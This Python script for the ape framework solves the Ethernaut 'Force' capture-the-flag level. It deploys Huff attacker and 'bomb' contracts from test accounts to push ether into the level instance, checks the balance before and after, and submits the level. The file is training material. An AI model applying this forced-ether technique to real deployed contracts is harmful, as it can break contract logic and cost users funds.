from ape import accounts
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_helper,
    deploy_huff_contract,
    encode,
    get_sig,
    send_tx,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x46f79002907a025599f355A04A512A6Fd45E671B"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    hacker = deploy_huff_contract("Force.huff", instance, user, value=1)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    receipt = send_tx(user, hacker, get_sig("balanceOf()"))
    print(f"\n--- Instance balance before exploit: {receipt.call_tree.outputs} ---\n")

    # deploying bomb contract
    huff_bomb = deploy_huff_helper("Bomb.huff", user)

    calldata = get_sig("attack(address)") + encode(["address"], [huff_bomb]).hex()
    send_tx(user, hacker, calldata)

    receipt = send_tx(user, hacker, get_sig("balanceOf()"))
    print(f"\n--- Instance balance after exploit: {receipt.call_tree.outputs} ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
